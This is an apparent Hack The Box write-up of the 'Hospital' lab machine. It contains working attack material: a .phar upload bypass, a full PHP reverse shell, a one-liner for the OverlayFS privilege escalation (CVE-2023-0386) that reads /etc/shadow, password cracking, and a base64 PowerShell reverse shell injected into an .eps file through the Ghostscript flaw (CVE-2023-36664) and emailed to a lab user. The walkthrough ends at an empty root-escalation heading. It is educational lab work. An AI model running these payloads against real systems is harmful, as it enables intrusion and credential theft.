# Initial Enumeration
I started off by conducting a full initial enumeration of the machine using [nmapAutomtor](https://github.com/21y4d/nmapAutomator), and [enum4linux](https://www.kali.org/tools/enum4linux/):

```bash
┌─[✗]─[user@parrot]─[~/Documents/tmp/nmapAutomator]
└──╼ $./nmapAutomator.sh -H 10.10.11.241 -t All

Running all scans on 10.10.11.241
..SNIP...

-------------------------------------------------------------------------------------
┌─[user@parrot]─[~]
└──╼ $enum4linux -a -l 10.10.11.241
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 20 11:43:34 2023

 ========================== 
|    Target Information    |
 ========================== 
 ...SNIP...
```

Let's summarize the information we've gathered:
- **OS:** Windows
- **Services:** we have a total of 31 open ports with the following services running:
  - SSH: 22
  - DNS: 53, 53/UDP
  - Microsoft Windows Kerberos: 88
  - SMB: 135 (msrpc), 445 (microsoft-ds)
  - Microsoft Windows netbios-ssn: 139
  - LDAP: 389, 636 (ldap-ssl), 3268 (globalcatLDAP), 3269 (globalcatLDAPssl)
  - HTTP/S: 443 (https), 8080 (http-proxy), 5985 (wsman)
  - Kpasswd5: 464
  - NCAN_HTTP: 593 (http-rpc-epmap/ncacn_http)
  - MSMQ: 1801, 2107 (msmq-mgmt)
  - Zephyr CLT: 2103
  - Eklogin: 2105
  - VMRDP: 2179
  - Microsoft Terminal Services: 3389 (ms-wbt-server)
  - Business Objects Enterprise internal server: 6404 (Business Objects Enterprise internal server), 6406 (boe-processsvr), 6407 (boe-resssvr1), 6409 (boe-resssvr3)
  - Kerberos V5 FTP Control (KFTP): 6621
  - Active Directory Web Services (ADWS) OR .NET Message Framing (MC NMF): 9389
  - Network Time Protocol (NTP v3): 123/UDP
  - Unknown: 6615, 15102
- **Domains:** hospital.htb, DC.hospital.htb (DNS)
- **Webserver headers:**
  - 443: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
    - Roundcube Webmail 1.6.4
  - 8080: Apache/2.4.55 (Ubuntu)
  - 5985: Microsoft-HTTPAPI/2.0
- **NetBIOS Computer Name:** DC
- **Usernames:** administrator

Looking at all the running services, we are most likely dealing with Windows Active Directory. However, we have two possibly interesting web apps running on ports 8080 and 443, so I will start off by looking for an exploit there.

## Web App Enumeration
As always, when enumerating a web app, we want to find all the subdomains and sub directories, inspect the source code, and note any interesting parameters we can see in the HTTP requests. To do this we will be using:
- Firefox Developer Tools 
- Burpsuite (or any other proxy)
- Ffuf

### 8080
When browsing to `http://10.10.11.241:8080`, we will see a login page:
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/7dcc9b3a-69c1-4f06-858b-42a9ff4d2121)


There is an option to register to the website, so I registered a user `hacker404` and logged in:
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/707b42ed-c6b2-4d6e-8c9b-7383774c1690)


Lets enumerate the website using Burp and Ffuf! There are our findings:
```
http://10.10.11.241:8080/ --> some login page
    /index.php
        - Sets PHPSESSID (no change after auth)
    /login.php
        - POST params: username=test&password=test
        - Wrong creds message: "Invalid username or password."
    /register.php
        - POST params: username=test&password=test&confirm_password=test
        /main.js
    /logout.php
    /upload.php --> image upload function - might be injectible!
    /success.php
    /failed.php
    /uploads
    /.htpasswd
    /config.php
```
### 443
When browsing to `https://10.10.11.241` we are met with a login page to a Hospital Webmail service:
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/5f1b98b0-131b-4ca4-ace2-d4ef4fe97dbd)

Lets enumerate the website using Burp and Ffuf! There are our findings:
```
https://10.10.11.241/ --> Hospital Webmail
    - Uses same PHPSESSID as set by the service on 8080
    - Sets a cookie: roundcube_sessid
    /?_task=login
        - POST params: _token=QRxq7ZNo5SKzXUvE2m5rh7sNMPO0jFx6&_task=login&_action=login&_timezone=Asia%2FJerusalem&_url=&_user=hacker404&_pass=password
    /liceses
    /installer
    /phpmyadmin
```

## Foothold
On `http://10.10.11.241:8080`, we can see a file upload function, which could be vulnerable to File Uploads! First, we will upload a random image to the website and view the HTTP requests using Burp:
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/86feea3a-3ce1-478f-b918-6733fba05788)

Now that we have the request, we want to check if we can change the file extension and upload executable files. We saw that the website main page was on `index.php`, which indicates that if we manage to upload a PHP file, it might get executed! 
To check if we can upload PHP files, we will send the HTTP request that was generated by the upload to Burp's Repeater. There, we will change the files extension `filename=puppy.php`. As we can see - the upload failed.
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/1f72e489-c348-4ea0-8284-9564d3a23404)

Using Burp's Intruder, lets fuzz for different PHP extensions using this wordlists, and see if any of them get past the extension filters and are uploaded successfully. We find that files with phar, pht, phpt, or pgif extensions get uploaded!
Our goal is to get a reverse shell by exploiting this vulnerability. These are the steps we are going to take:
- Find the file's upload location
- Check for other possible security measures (MIME type, magic bits, function restrictions)
- Create a `.phar` file containing a PHP script and upload it to the website
- Browse to the file to trigger its execution by the server

### Finding the Upload Location and Checking for Additional Security Measures
We will start off with a basic PHP script to verify execution and find the location:
```php
<?php echo "Hello World" ?>
```
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/cab3ad86-a198-4651-8ef8-0a29ac75323b)

We see that the file was uploaded successfully. Now we will try to browse to a generic upload location `/upload/filename`, and see if our file might be there: 

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/09664316-c787-46d4-ac63-981b1f24ada5)

Our file is there and got executed! Now we will try to find a suitable PHP reverse shell script. There a number of PHP functions that execute system command: system, shell_exec, exec, passthru, proc_open, popen, and eval. Some of these functions may be restricted for security reasons, so we will test each one for that. To do that we asked ChatGPT to create a simple PHP script that checks if a certain function is restricted.
Lets show an example with the system function. We will upload the following script and check the results:
```php
<?php

// Function to check if the system function is restricted
function isSystemFunctionRestricted() {
    return !function_exists('system');
}

// Check if the system function is restricted
if (isSystemFunctionRestricted()) {
    echo "The system function is restricted.\n";
} else {
    echo "The system function is not restricted.\n";
}

?>
```
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/cc94790d-4dba-4a2d-8f3b-d270b8c7d416)
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/b43362bb-666b-4644-92e4-8c422a0b3ca9)

As we can see, the system function is restricted. We will do the same for the rest of the functions mentioned above until we find a function that works - popen and eval are not restricted! 

### Getting a Reverse Shell
Now we can write a PHP script that will get us a reverse shell using one of them:
```php
<?php

$ip = 'ATTACKER IP';
$port = LISTENING PORT;

$sock = fsockopen($ip, $port);

if (is_resource($sock)) {
    $currentDirectory = getcwd();

    while (true) {
        // Display the current directory in the prompt
        fwrite($sock, "\nShell [{$currentDirectory}] > ");

        // Read the command from the socket
        $command = trim(fread($sock, 2048));

        // Check if the command is "exit" or "quit" to terminate the loop
        if (strtolower($command) == 'exit' || strtolower($command) == 'quit') {
            break;
        }

        $output = '';

        // Handle the interactive nature of shell commands
        if (strpos(strtolower(PHP_OS), 'win') !== false) {
            $command = "cd \"{$currentDirectory}\" && {$command} 2>&1";
        } else {
            // Check if the command starts with "cd " to handle directory changes
            if (substr($command, 0, 3) === 'cd ') {
                $targetDirectory = trim(substr($command, 3));
                $targetDirectory = rtrim($targetDirectory, "\r\n");
                // Change the current directory based on the parsed "cd" command
                if (is_dir($targetDirectory)) {
                    chdir($targetDirectory);
                    $currentDirectory = getcwd();
                    continue; // Skip executing the command in this iteration
                } else {
                    $output = "cd: {$targetDirectory}: No such file or directory";
                }
            } else {
                // Set the PATH variable explicitly before executing the command
                $command = 'export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin; ' . $command . ' 2>&1';
            }
        }

        // Execute the command
        $handle = popen($command, 'r');
        while (!feof($handle)) {
            $output .= fread($handle, 8192);
        }
        pclose($handle);

        // Send the command output back to the socket
        fwrite($sock, "\n" . $output);
    }

    fclose($sock);
}

?>
```

We will upload the script with Burp as we did before, and start a Netcat listener on our machine:
```bash
nc -lvnp <LISTENING_PORT>
```

This time, when we browse to `/uploads/shell.phar`, we get the reverse shell in our listener:
```bash
┌─[✗]─[user@parrot]─[~]
└──╼ $nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.11.241] 6514

Shell [/var/www/html/uploads] > id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
We got a very restricted shell as the user `www-date`. 

# Lateral Movement
We will start off with a basic enumeration of the machine, following the steps detailed by [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation). Some of the interesting findings are bellow:
```bash
Shell [/var/www/html/uploads] > cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...
fwupd-refresh:x:108:114:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
```
We found a user on the machine named `drwilliams`!

Also, found an interesting `file /var/www/html/config.php` containing credential!
```bash
Shell [/var/www/html] > cat config.php

<?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', '<--PASSWORD-->');
define('DB_NAME', 'hospital');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?>
```
```bash
Shell [/var/www/html/uploads] > uname -a

Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```
Lastly, we found that the kernel version is `5.19.0-35-generic`. After some googling we find that this kernel version is vulnerable to the OverlayFS vulnerability (CVE-2023-0386). According to [DataDog](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/#introduction):
> On March 22, 2023, a vulnerability in the Linux kernel was publicly disclosed. It is a local privilege escalation vulnerability, allowing an unprivileged user to escalate their privileges to the root user. 
> [...] CVE-2023-0386 lies in the fact that when the kernel copied a file from the overlay file system to the "upper" directory, it did not check if the user/group owning this file was mapped in the current user namespace. This allows an unprivileged user to smuggle an SUID binary from a "lower" directory to the "upper" directory, by using OverlayFS as an intermediary.

Further research got us to this [Reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?utm_source=embedv2&utm_medium=post_embed&utm_content=whitespace&embed_host_url=https://cdn.iframe.ly/C3LTELw) containing the command used to exploit this vulnerability:
```bash
unshare -rm sh -c 'mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;' && u/python3 -c "import os; os.setuid(0); os.system("COMMAND")"
```

Now we can continue our enumeration, but now as a privileged user. When reading the shadow files on the machine we now find password hashes!:
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os; os.setuid(0); os.system("cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null")'

...SNIP...
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:<--HASH-->:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
...SNIP...
```

The root hash is snipped, but drwilliams' hash is there in full! Lets use John The Ripper to find the user's password:
```bash
┌─[✗]─[user4@parrot]─[~/Documents/tmp/hospital]
└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:43 1.03% (ETA: 12:53:10) 0g/s 4055p/s 4055c/s 4055C/s anitram..ROSIE1
<--PASSWORD-->        (?)
1g 0:00:00:53 DONE (2023-11-22 11:44) 0.01884g/s 4043p/s 4043c/s 4043C/s raycharles..pl@yboy
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Remembering the Hospital Webmail service we found hosted on port 443, lets try to use the credentials for the `drwilliams` user to log in:
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/89f0d396-09e2-43f0-8582-72bc130ae25b)

Now that we are logged-in, we can see that there is an email from `drbrown` in the inbox.
![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/987ff26f-da21-4619-8c35-c97a79028e12)

In this email, `drbrown` mentions a file that `drwilliams` needs to send him. He reminds her that the file needs to be a `.eps` file _"so it can be well visualized with GhostScript"_. We can infer that this user is likely using GhostScript to view `.eps` files! We should google that and see if there are any known vulnerabilities in this service.
We found this [PoC](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/blob/main/README.md) to a GhostScript command injection vulnerability (CVE-2023-36664). As explained by [Debian](https://www.debian.org/security/2023/dsa-5446):
> It was discovered that Ghostscript, the GPL PostScript/PDF interpreter, does not properly handle permission validation for pipe devices, which could result in the execution of arbitrary commands if malformed document files are processed.

This means we can inject a payload into a `.eps` file, send it to `drbrown`, and when he opens it - it will get executed on the target machine! 
First we need to clone the PoC's repository to our attack machine:
```bash
git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/blob/main/CVE_2023_36664_exploit.py
```
As stated in the repo, we will create a basic [file.eps](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection/blob/main/file.eps) on our machine and use the following command to inject a payload:
```bash
python3 CVE_2023_36664_exploit.py -f file4.eps -p "PAYLOAD" -i
```
Now we need to craft a payload that will get us a reverse shell. After some trial and error, we found that the easiest way is to use [revshells.com](https://www.revshells.com/) to generate the payload. And, after some additional trial and error, we found that the script the works is the PowerShell #3 base64 payload:
```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAAyADQAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```
Next, we will use the CVE we found to inject the payload into `file.eps`, which we will be sending in a reply email to `drbrown`.  But of course, before sending the email we started a Netcat listener on our machine (just a we did before). We've got a reverse shell as `drbrown`,  who has the user flag on his desktop!

# Privesc To Root
